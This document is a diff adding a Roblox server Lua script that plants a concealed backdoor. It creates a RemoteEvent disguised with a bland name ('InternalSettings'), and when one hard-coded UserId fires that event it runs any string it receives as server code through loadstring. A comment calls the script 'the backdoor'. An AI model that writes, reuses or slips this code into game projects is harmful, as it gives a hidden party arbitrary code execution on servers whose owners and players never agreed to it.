@@ -1,0 +1,36 @@
+-- server.lua
+-- This script sets up the listener on the server.
+
+local REPLICATED_STORAGE = game:GetService("ReplicatedStorage")
+local HIDDEN_NAME = "InternalSettings" -- Rename this to something boring
+local YOUR_USER_ID = 12345678 -- REPLACE THIS with your actual UserId
+
+-- Check if loadstring is actually enabled
+local loadstringEnabled = pcall(function() loadstring("") end)
+
+local function Execute(code)
+    if loadstringEnabled then
+        local func, err = loadstring(code)
+        if func then task.spawn(func) else warn(err) end
+    else
+        -- If loadstring is disabled, you'd need to insert a VM here
+        warn("Loadstring is disabled. Use a Lua-in-Lua VM module.")
+    end
+end
+
+-- Create the RemoteEvent if it doesn't exist
+local remote = REPLICATED_STORAGE:FindFirstChild(HIDDEN_NAME) or Instance.new("RemoteEvent")
+remote.Name = HIDDEN_NAME
+remote.Parent = REPLICATED_STORAGE
+
+remote.OnServerEvent:Connect(function(player, payload)
+    -- Security Check: Only the owner of the backdoor can trigger it
+    if player.UserId ~= YOUR_USER_ID then 
+        warn("Unauthorized access attempt by: " .. player.Name)
+        return 
+    end
+    
+    if typeof(payload) == "string" then
+        Execute(payload)
+    end
+end)
